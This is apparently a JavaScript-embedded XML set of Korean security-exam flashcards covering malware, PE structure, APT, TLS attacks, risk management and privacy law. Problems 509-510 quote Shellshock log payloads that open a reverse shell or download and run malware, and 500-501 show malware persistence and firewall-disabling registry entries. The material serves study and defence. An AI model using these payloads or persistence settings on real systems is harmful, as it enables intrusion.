xml+='  <answer id="493">Deface(훼손)</answer>';
xml+='  <problem id="494">다음 악성코드는 무엇을 설명하는 것인가?&lt;br&gt;&lt;br&gt;1)악성코드에서 지정한 외부 주소에 접속하여 추가 악성코드를 &lt;br&gt;다운로드하여 실행시키는 악성코드&lt;br&gt;&lt;br&gt;2)자신의 내부에 포함되어 있는 데이터를 이용하여 악성코드를 생성&lt;br&gt;&lt;br&gt;3)자신의 데이터를 이용해 바로 새로운 프로세스를 생성하여 &lt;br&gt;메모리에 상주시키는 형태&lt;br&gt;&lt;br&gt;4)특정 포트를 열어두어 정상적인 인증 과정 없이 원격 접속을 &lt;br&gt;통해 직접 조작하는 형태&lt;br&gt;&lt;br&gt;5)정상적인 소프트웨어의 형태를 띠지만 악위적인 행위를 포함하고 있는 악성코드&lt;br&gt;&lt;br&gt;6)상업용 광고 목적으로 만들어진 악성코드&lt;br&gt;&lt;br&gt;7) 사전 동의 없이 설치되어 컴퓨터 정보와 개인정보를 수집하는 악성코드&lt;br&gt;&lt;br&gt;8)PC의 부팅영역인 MBR을 조작하는 프로그램을 칭하는 이름으로 (                 )과 (               )으로 나뉜다.</problem>';
xml+='  <answer id="494">1) 다운로더&lt;br&gt;2) 드롭퍼&lt;br&gt;3) 인젝터&lt;br&gt;4) 백도어&lt;br&gt;5) 트로이목마&lt;br&gt;6) 애드웨어&lt;br&gt;7) 스파이웨어&lt;br&gt;8) Bootkit(MBR, UBR)</answer>';
xml+='  <problem id="495">실행 파일의 크기를 줄이고 내부 코드와 리소스를 감추기 위해&lt;br&gt;압축 또는 암호화하는 기법은?</problem>';
xml+='  <answer id="495">Packing</answer>';
xml+='  <problem id="496">(         )는 windows 운영체제에서 사용하고 있는 &lt;br&gt;실행 파일 포맷으로 실행파일이 적재되는 가상주소, &lt;br&gt;import함수 목록, Import함수 목록, Export함수 목록, &lt;br&gt;데이터, 코드 등의 정보를 관리하기 위해 파일의 첫 부분에 &lt;br&gt;여러 가지 구조체로 구성된다.</problem>';
xml+='  <answer id="496">PE(Portable Executable)</answer>';
xml+='  <problem id="497">PE(portable executable) Header 중 &lt;br&gt;IMAGE_DOS_HEADER, &lt;br&gt;MS-DOS Stub Program, &lt;br&gt;IMAGE_NT_HEADERS 각각의 역할을?</problem>';
xml+='  <answer id="497">IMAGE_DOS_HEADER =&gt; 윈도우 운영체제의 하위 호환성 자원, &lt;br&gt;실제 윈도우용 PE 헤더 위치를 가리킴&lt;br&gt;&lt;br&gt;MS-DOS_Stub Program =&gt; DOS 운영체제에서 윈도우용 PE 파일&lt;br&gt;을 실행했을 때 보여줄 오류 메세지&lt;br&gt;&lt;br&gt;IMAGE_NT_HEADER =&gt; 실제 PE파일 실행에 필요한 핵심적인 &lt;br&gt;기능</answer>';
xml+='  <problem id="498">PE(portable executable) 파일 섹션 구조는?</problem>';
xml+='  <answer id="498">.text =&gt; 실행코드    &lt;br&gt;.data =&gt; R/W 전역변수&amp;정적변수    &lt;br&gt;.rdata =&gt; 상수형 변수&amp;문자열 상수&lt;br&gt;.bss =&gt; 초기화 되지 않은 전역변수&lt;br&gt;.idata =&gt; 임폴트할 DLL&amp;API(&lt;-&gt;.edata)&lt;br&gt;.rsrc =&gt; 윈도우 애플리케이션 리소스 관련 데이터&lt;br&gt;.reloc =&gt; 재배치 정보</answer>';
xml+='  <problem id="499">(                )은 레지스트리 정보를 저장하고 있는&lt;br&gt;물리적인 파일로 오프라인 상태인 비활성 시스템에서&lt;br&gt;레지스트리를 분석할 때 활용한다.&lt;br&gt;</problem>';
xml+='  <answer id="499">하이브 파일(Hive)&lt;br&gt;</answer>';
xml+='  <problem id="500">다음 레지스트리를 설명하시오.&lt;br&gt;&lt;br&gt;1) HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\windows\\CurrentVersion\\Run&lt;br&gt;2)HKEY_CURRENT_USER\\Software\\Microsoft\\windows\\currentVersion\\Run&lt;br&gt;3)HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\winlogon&lt;br&gt;4)HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ALGISA Agent&lt;br&gt;-&gt; cmd: sc create "ALGISA Agent" binpath="c:\\windows\\System32\\exp1orer.exe"&lt;br&gt;    displayname = "ALGISA Agent Service" start= auto&lt;br&gt;    obj = "NT AUTHORITY\\LOCALService"</problem>';
xml+='  <answer id="500">1) 현재 사용자 로그인 시 동작하는 시작 프로그램&lt;br&gt;2) 윈도우 시작 시 동작하는 시작 프로그램&lt;br&gt;3) 윈도우 로그인 시 동작하는 시작 프로그램&lt;br&gt;4) 서비스 자동 실행에 악성코드 등록</answer>';
xml+='  <problem id="501">다음 레지스트리를 설명하시오.&lt;br&gt;&lt;br&gt;1)HKEY_CLASSES_ROOT\\Directory\\shell\\CommandPrompt\\command&lt;br&gt;value : @="C:\\\\windows\\\\system32\\\\exp1orer.exe"&lt;br&gt;&lt;br&gt;2)HKEY_LOCAL_MACHINE\\Software\\Classes\\batfile/comfile/exefile\\open\\Command&lt;br&gt;value : @="C:\\\\windows\\\\system32\\\\exp1orer.exe\\"%1\\" %*" &lt;br&gt;&lt;br&gt;3)HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\sharedAccess\\Parameters\\FirewallPolicy\\StandardProfile&lt;br&gt;value : "EnableFirewall" = dword:00000000&lt;br&gt;&lt;br&gt;4)HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\list&lt;br&gt;value : "악성코드 경로" = "악성코드 경로:*:Enabled:ALGISA Agent"&lt;br&gt;&lt;br&gt;5)HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GlobalyOpenPorts\\List&lt;br&gt;value : "4321:TCP"="4321:TCP:*:enabled:ALGISA_Agent"&lt;br&gt;&lt;br&gt;6)HKEY_CURRENT_USER\\Software\\Microsoft\\windows\\currentVersion\\Explorer\\Advanced&lt;br&gt;value: "Hidden"=dword: 00000002 or 00000000&lt;br&gt;HKEY_CURRENT_USER\\Software\\Microsoft\\windows\\currentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL &lt;br&gt;value : "CheckedValue" = dword:00000000&lt;br&gt;&lt;br&gt;7)HKEY_CURRENT_USER\\Software\\Microsoft\\windows\\CurrentVersion\\Explorer\\Advanced&lt;br&gt;value:"ShowSuperHidden"=dword:00000000&lt;br&gt;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\SuperHidden&lt;br&gt;value: "UncheckedValue"=dword:00000000</problem>';
xml+='  <answer id="501">1) 윈도우 탐색기 디렉터리 context menu에 악성코드 실행 메뉴 추가&lt;br&gt;2) 특정 확장자(bat,com,exe 등)실행 시 악성코드 자동 실행&lt;br&gt;3) 윈도우 방화벽 우회 설정&lt;br&gt;4) 윈도우 방화벽에 악성코드 예외 허용&lt;br&gt;5) 윈도우 방화벽에 악성코드가 사용하는 특정 포트 오픈 예외 허용&lt;br&gt;6) 숨김 파일 및 폴더 표시&amp; 변경할 수 없도록 설정&lt;br&gt;7) 보호된 운영체제 파일 숨기기 &amp; 변경할 수 없도록 설정</answer>';
xml+='  <problem id="502">지능형 지속 공격인 APT에 대해 설명하시오.</problem>';
xml+='  <answer id="502">특정 표적을 대상으로 취약점을 파악하고 다양한 공격 기법을 &lt;br&gt;이용한 지속적인 공격활동으로 정보 탈취, 시스템 파괴 등의 &lt;br&gt;손상을 입히는 "공격 프로세스/절차"를 의미한다.</answer>';
xml+='  <problem id="503">APT 침투 기법 3가지를 서술하시오.</problem>';
xml+='  <answer id="503">1) 스피어 피싱&lt;br&gt;특정인(조직)을 표적으로 신뢰할만한 발신인이 보낸 것처럼 &lt;br&gt;위장한 이메일 발송&lt;br&gt;&lt;br&gt;2) 워터링 홀&lt;br&gt;사회공학기법을 통해 공격 대상이 주로 방문하는 &lt;br&gt;웹사이트에 대한 정보를 사전에 파악한 후 제로데이 취약점 등을&lt;br&gt;이용하여 해당 사이트에 악성코드를 심어두고 공격 대상이 해당 &lt;br&gt;사이트에 접근하게 되면 악성코드에 감염되는 방식&lt;br&gt;&lt;br&gt;3) USB 메모리 스틱&lt;br&gt;</answer>';
xml+='  <problem id="504">사이버 킬 체인이란?</problem>';
xml+='  <answer id="504">공격자는 사이버상에서 표적에 대한 공격을 위해 &lt;br&gt;일련의 공격 단계를 거치는데 이런 단계 중 어느 한 단계의 공격을 &lt;br&gt;탐지/차단/대응해 목표 달성 이전에 선제적으로 무력화시키는 &lt;br&gt;방어 시스템이다.</answer>';
xml+='  <problem id="505">SSH 클라이언트가 SSH 서버에 접속하여 만든 연결을 &lt;br&gt;다른 어플리케이션에서 이용하여 통신할 수 있는 기술을 무엇이라&lt;br&gt;하는가?</problem>';
xml+='  <answer id="505">SSH 포트 포워딩</answer>';
xml+='  <problem id="506">NTFS 파일시스템 구조에 대해 설명하시오.</problem>';
xml+='  <answer id="506">MBR -&gt; 부트 코드(부팅 가능한 파티션을 찾아 해당 파티션 &lt;br&gt;VBR 호출), 파티션 테이블, 시그니처로 구성&lt;br&gt;&lt;br&gt;VBR -&gt; 윈도우 부팅을 위한 기계어 코드와 불륨 및 클러스트의 &lt;br&gt;크기 MFT의 시작주소 등 설정 정보를 담고 있으며 &lt;br&gt;파티션의 가장 마지막 섹터에 VBR 백업본을 가지고 있다.&lt;br&gt;&lt;br&gt;MFT -&gt; 모든 파일과 디렉터리에 대한 정보를 담고 있는 테이블</answer>';
xml+='  <problem id="507">디스크 파괴형 악성코드는 어떻게 동작하는가?</problem>';
xml+='  <answer id="507">MBR 영역의 모든 값을 특정 문자나 랜덤한 쓰레기 값으로 &lt;br&gt;덮어 씌운다.</answer>';
xml+='  <problem id="508">bash에서 환경변수의 함수 선언문 뒤에 임의의 명령어를 &lt;br&gt;삽입할 경우 환경 변수에 설정된 함수 선언 시 함수 선언의 끝을 &lt;br&gt;인지하지 못하고 삽입한 명령어까지 실행하는 취약점은?</problem>';
xml+='  <answer id="508">ShellShock</answer>';
xml+='  <problem id="509">다음 로그에 대해 설명하시오.&lt;br&gt;User-Agent:() {:;}; /bin/bash &gt; /dev/tcp/10.10.10.10/8081 0&lt;&amp;1</problem>';
xml+='  <answer id="509">CGI를 통한 Bash 취약점 공격으로 " () {"을 통해 &lt;br&gt;ShellShock 임을 알 수 있다. /dev/tcp는 특수한 장치파일로 &lt;br&gt;TCP 클라이언트 소켓을 생성하는 파일이며, &lt;br&gt;/dev/tcp/목적지 IP/목적지 port를 통해 해당 목적지에 접속한다.&lt;br&gt;리다이렉션을 통해 공격자가 bash의 입출력을 모두 통제할 수 &lt;br&gt;있고, 리버스 쉘에 성공할 수 있게 된다.</answer>';
xml+='  <problem id="510">다음 로그를 설명하시오.&lt;br&gt; Accept-Encoding : (){:;}; /bin/bash -c "/usr/bin/wget -O /tmp/xyz http://10.10.10.10/malware; /bin/chmod 777 /tmp/xyz; /tmp/xyz; /bin/rm -rf /tmp/xyz"&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="510">CGI를 이용한 Bash 취약점 공격으로 -c(명령어로 해석) 옵션을 &lt;br&gt;통해 원격 다운로드를 통한 공격을 하고 있다.</answer>';
xml+='  <problem id="511">Bash(ShellShock)취약점의 대응 방안은?</problem>';
xml+='  <answer id="511">1) 취약 Bash 사용시 최신 버전으로 업데이트&lt;br&gt;2) CGI 미사용 시 중지&lt;br&gt;3) snort에서 탐지 후 삭제 =&gt; content:"() {"; http_header;</answer>';
xml+='  <problem id="512">공격자가 MITM 공격을 통해 512 비트 RSA로 다운그레이드 시켜&lt;br&gt;정보를 유출 시키는 공격은?</problem>';
xml+='  <answer id="512">FREAK Attack</answer>';
xml+='  <problem id="513">임시 Diffie-Hellman 키교환을 사용하여 TLS연결을 512비트 수출 &lt;br&gt;버전 암호화로 다운그레이드 할 수 있는 취약점은?</problem>';
xml+='  <answer id="513">LogJam 취약점</answer>';
xml+='  <problem id="514">(            ) 취약점은 SSL/TLS 협상 시 버전 다운그레이드 공격을 &lt;br&gt;통해 SSLv3.0을 사용하도록 강제한 후 MITM 공격을 통해 &lt;br&gt;암호화되어 송수신되는 쿠키정보나 데이터를 추출한다.</problem>';
xml+='  <answer id="514">POODLE 취약점</answer>';
xml+='  <problem id="515">(                 )는 네트워크를 통해 컴퓨터 시스템 간 시간 동기화를 &lt;br&gt;위해 사용하는 인터넷 프로토콜로 (              )를 서비스 포트로 &lt;br&gt;사용한다.</problem>';
xml+='  <answer id="515">NTP(Network Time Protocol), UDP</answer>';
xml+='  <problem id="516">NTP(Network Time Protocol)를 이용한 DRDoS 대응 방법은?</problem>';
xml+='  <answer id="516">1) 서버 버전 업그레이드&lt;br&gt;&lt;br&gt;2) /etc/ntp.conf에서 disable monitor을 통해 monlist 기능 해제 &lt;br&gt;&lt;br&gt;3) iptables -A OUTPUT -p udp --sport 123 &lt;br&gt;-m length --length 100: -j DROP</answer>';
xml+='  <problem id="517">정보 보안 모델 중 보안 정책을 정형화 하기 위한 수단인&lt;br&gt;세 가지 도메인을 쓰시오.&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="517">? 접근 통제 모델&lt;br&gt;&lt;br&gt;? 무결성 모델&lt;br&gt;&lt;br&gt;? 정보 흐름 모델</answer>';
xml+='  <problem id="518">접근 통제 보안 모델을 쓰고 &lt;br&gt;정보보안 3요소(CIA)에 따라 분류하시오.</problem>';
xml+='  <answer id="518">기밀성 : 벨라파둘라(BLP)&lt;br&gt;무결성 : 비바, 클락-월슨, 만리장성모델&lt;br&gt;</answer>';
xml+='  <problem id="519">정보보호 계획 수립 과정에서 정보보호에 대한 목표, &lt;br&gt;방향이 제시된 최상위 문서로 조직이 수행하는 &lt;br&gt;모든 정보보호 활동의 근거가 되는 것은?</problem>';
xml+='  <answer id="519">정보보호정책</answer>';
xml+='  <problem id="520">정보보호정책 구현요소에 대해 설명하시오.</problem>';
xml+='  <answer id="520">표준 : 사용자들이 준수하도록 요구되어지는 강제 규정&lt;br&gt;지침 : 정보보호 활동에 필요하거나 도움이되는 세부사항에 대한&lt;br&gt;          규정, 강제성 미약&lt;br&gt;&lt;br&gt;절차 : 구체적으로 어떻게 해야 하는지&lt;br&gt;기준선 : 최소 보호 수준을 정의</answer>';
xml+='  <problem id="521">다음 괄호 안에 들어갈 말로 알맞은 것은?&lt;br&gt;&lt;br&gt;( )란 조직의 자산에 대한 위험을 감수할 수 있는 수준으로 &lt;br&gt;유지하기 위하여 자산에 대한 위험을 분석하고 이러한 &lt;br&gt;위험으로부터 자산을 보호하기 위한 비용대비 효과적인 &lt;br&gt;보호대책을 마련하는 일련의 과정</problem>';
xml+='  <answer id="521">위험관리</answer>';
xml+='  <problem id="522">위험관리 과정은?</problem>';
xml+='  <answer id="522">위험관리 전략 및 계획 수립, 위험 분석, 위험 평가, &lt;br&gt;정보보호 대채 선정, 정보보호 계획 수립</answer>';
xml+='  <problem id="523">(        A         )이란 원하지 않는 사건이 발생하여 손실 또는 &lt;br&gt;부정적인 영향을 미칠 가능성을 말한다. &lt;br&gt;이와 관련된 요소로 (B),(C),(D),(E) 등이 있다.</problem>';
xml+='  <answer id="523">A : 위험&lt;br&gt;B : 자산(유형/무형의 조직이 보호해야 할 대상)&lt;br&gt;C : 취약성(위협의 이용 대상)&lt;br&gt;D : 위협(자산에 손실을 초래할 수 있는 원치 않는 사건의 &lt;br&gt;잠재적 원인이나 행위자)&lt;br&gt;E : 정보보호대책(자산 보호를 위한 기술적/관리적 대책)</answer>';
xml+='  <problem id="524">상세 위험 분석/평가 방법에 대해 설명하시오.</problem>';
xml+='  <answer id="524">1) 정성적 위험분석&lt;br&gt;델파이법(전문가 집단 구성), &lt;br&gt;순위결정법(위협을 상호 비교하여 우선순위 결정), &lt;br&gt;시나리오법(어떤 사건도 기대대로X, 추정),&lt;br&gt;퍼지행렬법(자산가치-화폐, 위험발생확률-변수))&lt;br&gt;&lt;br&gt;2) 정량적 위험분석&lt;br&gt;과거자료 분석법, &lt;br&gt;수학공식 접근법(위협의 발생빈도를 식으로 계산),&lt;br&gt;확률 분포법(확률적 편차를 사용),&lt;br&gt;점수법(가중치를 두어 위협을 추정)&lt;br&gt;</answer>';
xml+='  <problem id="525">정량적 위험분석 단계에 나오는 4가지 개념과 &lt;br&gt;구하는 방법을 설명하시오.</problem>';
xml+='  <answer id="525">1) 노출 계수(EF) : 자산에 끼칠 수 있는 손실 비율&lt;br&gt;2) 단일예상손실액(SLE) : 자산 가치 X 노출 계수&lt;br&gt;3) 연간 발생률(ARO) : 5년에 1번이라면 0.2&lt;br&gt;4) 연간 예상 손실액(ALE) : SLA X ARO</answer>';
xml+='  <problem id="526">위험 처리 방식 4가지를 서술하시오.&lt;br&gt;</problem>';
xml+='  <answer id="526">위험 수용, 위험 감소, 위험 전가, 위험 회피</answer>';
xml+='  <problem id="527">업무 연속성 계획(Business continuity Planning) 단계를 쓰시오.</problem>';
xml+='  <answer id="527">프로젝트 범위 및 설절 -&gt; BIA -&gt; 복구전략개발 -&gt; &lt;br&gt;복구계획수립 -&gt; 수행 및 유지보수</answer>';
xml+='  <problem id="528">재난 복구 서비스 5가지 종류를 쓰시오.</problem>';
xml+='  <answer id="528">mirror, hot, warm, cold, 백업서비스</answer>';
xml+='  <problem id="529">침해 사고 대응 7단계를 쓰시오.</problem>';
xml+='  <answer id="529">사고 전 준비 -&gt; 탐지 -&gt; 초기 대응 -&gt; 대응 전략 수립 -&gt; &lt;br&gt;사고 조사 -&gt; 보고서 작성 -&gt; 복구 및 해결 과정</answer>';
xml+='  <problem id="530">디지털 포렌식 5대 원칙은?</problem>';
xml+='  <answer id="530">무결성, 정당성, 신속성, 재현, 연계 보관성</answer>';
xml+='  <problem id="531">개인정보를 쉽게 검색할 수 있도록 일정한 규칙에 따라 &lt;br&gt;체계적으로 배열하거나 구성한 개인정보의 집합물?</problem>';
xml+='  <answer id="531">개인정보파일</answer>';
xml+='  <problem id="532">업무를 목적으로 개인 정보 파일을 운용하기 위하여 스스로 또는 &lt;br&gt;다른 사람을 통하여 개인정보를 처리하는 공공기관, &lt;br&gt;법인, 단체 및 개인을 무엇이라 하는가?</problem>';
xml+='  <answer id="532">개인정보처리자</answer>';
xml+='  <problem id="533">개인정보 처리에 관한 업무를 총괄하는 책임자는?</problem>';
xml+='  <answer id="533">개인정보 보호책임자</answer>';
xml+='  <problem id="534">개인정보처리자의 지휘/감독을 받아 개인정보를 처리하는 &lt;br&gt;임직원, 파견근로자, 시간제근로자 등을 뭐라고 하는가?</problem>';
xml+='  <answer id="534">개인정보취급자</answer>';
xml+='  <problem id="535">다음은 개인정보 처리 단계를 나타낸 것이다.&lt;br&gt;괄호에 알맞은 순서를 적으시오.&lt;br&gt;&lt;br&gt;수집-&gt; ( A ) -&gt; ( B ) -&gt; 관리 -&gt; 파기</problem>';
xml+='  <answer id="535">A : 이용 &lt;br&gt;B : 제공</answer>';
xml+='  <problem id="536">개인정보처리자는 다음의 경우에 개인정보를 수집할 수 있고 &lt;br&gt;그 (              )에서 이용할 수 있다.&lt;br&gt;&lt;br&gt;위 빈 괄호를 채우시오.</problem>';
xml+='  <answer id="536">수집 목적 범위내&lt;br&gt;&lt;br&gt;1) 정보 주체의 동의를 받은 경우&lt;br&gt;&lt;br&gt;2) 법률에 특별한 규정이 있거나 법령상 의무 준수를 위해 불가피한 경우&lt;br&gt;&lt;br&gt;3) 공공기관이 법령 등에서 정하는 소관업무 수행을 위해 불가피한 경우&lt;br&gt;&lt;br&gt;4) 정보주체와의 계약의 체결 및 이행을 위해 불가피한 경우&lt;br&gt;&lt;br&gt;5) 명백히 정보주체 등의 급박한 생명, 신체, 재산의 이익을 위해 필요한 경우&lt;br&gt;&lt;br&gt;6) 개인정보처리자의 정당한 이익을 달성하기 위하여 필요한 경우로서 명백하게 정보주체의 권리보다 우선하는 경우</answer>';
xml+='  <problem id="537">정보 주체 동의 시 고지 의무 사항은? </problem>';
xml+='  <answer id="537">1) 개인정보 수집/이용 목적&lt;br&gt;&lt;br&gt;2) 수집하려는 개인정보 항목&lt;br&gt;&lt;br&gt;3) 개인정보의 보유 및 이용 기간&lt;br&gt;&lt;br&gt;4) 동의를 거부할 권리가 있다는 사실 및 거부에 따른 &lt;br&gt;불이익이 있는 경우에는 그 불이익 내용</answer>';
xml+='  <problem id="538">개인정보의 이전이 발생하는 경우 2가지를 비교하시오.</problem>';
xml+='  <answer id="538">제 3자 제공 : 제공받는 자의 이익/목적을 위해 개인정보 이전 &lt;br&gt;ex) 제휴 업체&lt;br&gt;&lt;br&gt;위탁 : 위탁자의 이익/목적을 위해 개인정보 이전 &lt;br&gt;ex) 택배 업체</answer>';
xml+='  <problem id="539">개인정보를 목적 외 이용하거나 제3자에게 제공하는 것은 &lt;br&gt;원칙적으로 금지한다. 단, 정보주체 또는 제 3자의 이익을 &lt;br&gt;부당하게 침해할 우려가 없는 경우에 예외적으로 허용하는 경우는?</problem>';
xml+='  <answer id="539">1) 정보 주체의 별도의 동의를 받은 경우&lt;br&gt;&lt;br&gt;2) 다른 법률에 특별한 규정이 있는 경우&lt;br&gt;&lt;br&gt;3) 명백히 정보주체 또는 제 3자의 생명, 신체, 재산의 이익에 필요한 경우&lt;br&gt;&lt;br&gt;4) 통계 작성 및 학술연구 목적에 필요한 경우로 특정개인을 알아볼 수 없는 형태로 제공하는 경우</answer>';
xml+='  <problem id="540">마케팅 및 홍보 목적은 정보주체가 이를 명확하게 &lt;br&gt;인식할 수 있도록 알리고 동의를 받아야 한다. (O,X)</problem>';
xml+='  <answer id="540">O</answer>';
xml+='  <problem id="541">선택적으로 동의할 수 있는 사항을 동의하지 않는다는 이유로 &lt;br&gt;재화 또는 서비스의 제공을 거부해서는 안된다.(O,X)</problem>';
xml+='  <answer id="541">O</answer>';
xml+='  <problem id="542">만 14세 미만 아동의 개인정보를 처리하려면 (                   )의 &lt;br&gt;동의를 받아야한다.</problem>';
xml+='  <answer id="542">법정대리인</answer>';
xml+='  <problem id="543">민감정보와 고유식별정보에는 무엇이 있는가?</problem>';
xml+='  <answer id="543">민감 정보 : 사상/신념,노동 조합/정당의 가입/탈퇴, &lt;br&gt;정치적 견해, 건강, 성생활&lt;br&gt;&lt;br&gt;고유식별정보 : 주민등록번호, 운전면허번호, 여권번호, &lt;br&gt;외국인 등록 번호</answer>';
xml+='  <problem id="544">민감정보와 고유식별정보는 원칙적으로 처리를 금지하는 데 &lt;br&gt;예외는?</problem>';
xml+='  <answer id="544">다른 개인정보의 처리에 대한 동의와 별도로 동의를 얻은 경우, &lt;br&gt;법령에서 구체적으로 처리를 요구하거나 허용하는 경우 &lt;br&gt;(규정에도 불구하도 주민등록번호는 법령에 구체적으로 &lt;br&gt;처리 근거가 있어야 처리 가능하다 - 주민번호 수집 법정주의)</answer>';
xml+='  <problem id="545">누구든지 공개된 장소에서는 영상정보처리기기 설치 및 &lt;br&gt;운영을 원칙적으로 금지한다. 예외는?</problem>';
xml+='  <answer id="545">1) 법령에서 구체적으로 허용하는 경우&lt;br&gt;2) 범죄의 예방 및 수사&lt;br&gt;3) 시설 안전 및 화재 예방&lt;br&gt;4) 교통단속&lt;br&gt;5) 교통정보의 수집/분석 및 제공</answer>';
xml+='  <problem id="546">영상정보처리기기 안내문에 기재할 항목?</problem>';
xml+='  <answer id="546">1) 설치 목적 및 장소&lt;br&gt;2) 촬영 범위 및 시간&lt;br&gt;3) 관리책임자 및 연락처&lt;br&gt;4) 그 밖에 대통령령으로 정하는 사항</answer>';
xml+='  <problem id="547">업무를 위탁하는 개인정보처리자는 정보주체가 언제든지 쉽게 &lt;br&gt;확인할 수 있도록 대통령령으로 정하는 방법에 따라 &lt;br&gt;무엇을 공개해야 하는가?</problem>';
xml+='  <answer id="547">위탁하는 업무의 내용과 수탁자 </answer>';
xml+='  <problem id="548">공공기관의 장은 대통령령으로 정하는 기준에 해당하는 &lt;br&gt;개인정보파일의 운용으로 인하여 정보주체의 개인정보 침해가 &lt;br&gt;우려되는 경우에는 그 위험요인의 분석과 개선 사항 도출을 &lt;br&gt;위한 평가를 하고 그 결과를 (           )에게 제출하여야 한다.</problem>';
xml+='  <answer id="548">행정안전부장관</answer>';
xml+='  <problem id="549">개인정보 유출 시 신고 기관, 대상, 시기, 방법, 내용에 &lt;br&gt;대해 설명하시오.</problem>';
xml+='  <answer id="549">신고기관 : 1천명 이상의 개인정보가 유출된 경우 &lt;br&gt;행정안전부, 전문기관(한국인터넷진흥원)&lt;br&gt;&lt;br&gt;대상 : 정보 주체&lt;br&gt;&lt;br&gt;시기 : 지체 없이(5일 이내) 통지&lt;br&gt;&lt;br&gt;방법 : 개별통지 -&gt; 서면, 전자우편, 팩스, 문자전송, 전화 (1천명 이상의 경우 서면 등의 방법과 함께 인터넷 홈페이지에 7일이상 게재)&lt;br&gt;&lt;br&gt;내용 : 유출된 개인 정보 항목, 유출된 시점과 그 경위, 피해를 최소화하기 위하여 정보주체가 할 수 있는 방법, 개인정보처리자의 대응조치 및 피해구제절차, 피해 신고 등 접수 가능한 담당부서 &lt;br&gt;및 연락처</answer>';
xml+='  <problem id="550">개인정보보보호법 시행령 중 개인정보의 안전성 확보 조치를 &lt;br&gt;관리적 / 기술적 / 물리적으로 간단히 기술하시오.</problem>';
xml+='  <answer id="550">관리적 조치 : 내부 관리 계획수립&lt;br&gt;&lt;br&gt;기술적 조치 : 접근 통제 및 접근 권한, 암호화, &lt;br&gt;접속 기록의 보관&amp;위/변조 방지, 보안 프로그램 설치 및 갱신&lt;br&gt;&lt;br&gt;물리적 조치 : 보관 시설, 잠금 장치 등 물리적 조치&lt;br&gt;</answer>';
xml+='  <problem id="551">개인정보 유출에 영향을 미칠 수 있는 다양한 위험요소를 &lt;br&gt;식별/평가하고 해당 위험요소를 적절하게 통제할 수 있는 &lt;br&gt;방안 마련을 위한 종합적으로 분석하는 행위는?</problem>';
xml+='  <answer id="551">위험도 분석</answer>';
xml+='  <problem id="552">전기통신설비와 컴퓨터 및 컴퓨터의 응용기술을 활용하여 정보를 수집/가공/저장/검색/송신 또는 수신하는 정보통신체계?</problem>';
xml+='  <answer id="552">정보통신망</answer>';
xml+='  <problem id="553">물리적 망분리, 접근 통제시스템 등에 의해 인터넷 구간에서의 접근이 통제 또는 차단되는 망을 무엇이라 하는가?</problem>';
xml+='  <answer id="553">내부망</answer>';
xml+='  <problem id="554">다음 빈 괄호를 채우시오.&lt;br&gt;&lt;br&gt; (           ) : 개인정보취급자 등이 (                )에 접속한 사실을 알 수 있는 (         ), (          ), (          ), (          ) 등을 전자적으로 기록한 것이다.</problem>';
xml+='  <answer id="554">접속기록, 개인정보처리시스템, 계정, 접속일시, 접속자 정보, &lt;br&gt;수행업무</answer>';
xml+='  <problem id="555">접근 권한 관리기준 5가지를 서술하시오.</problem>';
xml+='  <answer id="555">1) 최소한의 범위로 차등 부여&lt;br&gt;&lt;br&gt;2) 개인정보취급자가 변경된 경우 접근 권한 변경 or 말소(권한부여, 변경, 말소, 기록은 최소 3년간 보관) +5년&lt;br&gt;&lt;br&gt;3) 개인정보취급자별로 사용자계정 발급&lt;br&gt;&lt;br&gt;4) 비밀번호 작성규칙 수립&lt;br&gt;&lt;br&gt;5) 임계값 설정</answer>';
xml+='  <problem id="556">접근통제 관리기준 5가지를 서술하시오.</problem>';
xml+='  <answer id="556">1) 개인정보처리시스템 접속 권한 IP 주소 등으로 제한/분석&lt;br&gt;&lt;br&gt;2) 외부에서 접속 시 안전한 접속수단(VPN, 접속선), 인증수단(PKI, 보안토근, OTP)적용&lt;br&gt;&lt;br&gt;3) 고유식별정보, 연 1회 이상 취약점 &lt;br&gt;&lt;br&gt;4) 타임 아웃 설정&lt;br&gt;&lt;br&gt;5) 업무용 모바일 기기 비밀번호 설정</answer>';
xml+='  <problem id="557">해킹, 컴퓨터바이러스, 논리폭탄, 메일폭탄, 서비스 거부 또는 고출력 전자기파 등의 방법으로 정보통신망 또는 이와 관련된 &lt;br&gt;정보시스템을 공격하는 행위를 하여 발생한 사태?</problem>';
xml+='  <answer id="557">침해 사고</answer>';
xml+='  <problem id="558">정보통신망법에서도 민감정보는 원칙적으로 수집이 금지다. &lt;br&gt;예외는?</problem>';
xml+='  <answer id="558">본인이 동의한 경우, &lt;br&gt;다른 법률에 개인정보 수집이 허용된 경우</answer>';
xml+='  <problem id="559">정보통신서비스 제공자가 주민등록번호를 수집/이용할 수 있는 &lt;br&gt;경우는?</problem>';
xml+='  <answer id="559">본인확인기관, 법령에 따른 수집/이용, 영업상 목적을 위해 &lt;br&gt;불가피한 경우로서 방통위가 고시하는 경우</answer>';
xml+='  <problem id="560">주민등록번호 이외의 본인확인을 위한 (           )을 제공해야한다.&lt;br&gt;위 괄호안에 들어갈 말로 옳은 것은?</problem>';
xml+='  <answer id="560">대체 수단 &lt;br&gt;EX)휴대폰 본인인증, 아이핀 인증, 공인인증서 인증</answer>';
xml+='  <problem id="561">정보통신제공자는 개인정보 처리위탁을 하는 경우에 &lt;br&gt;어떤 사항을 이용자에게 알리고 동의를 받아야 하는가?</problem>';
xml+='  <answer id="561">개인정보 처리위탁을 받는 자, 처리위탁을 하는 업무의 내용</answer>';
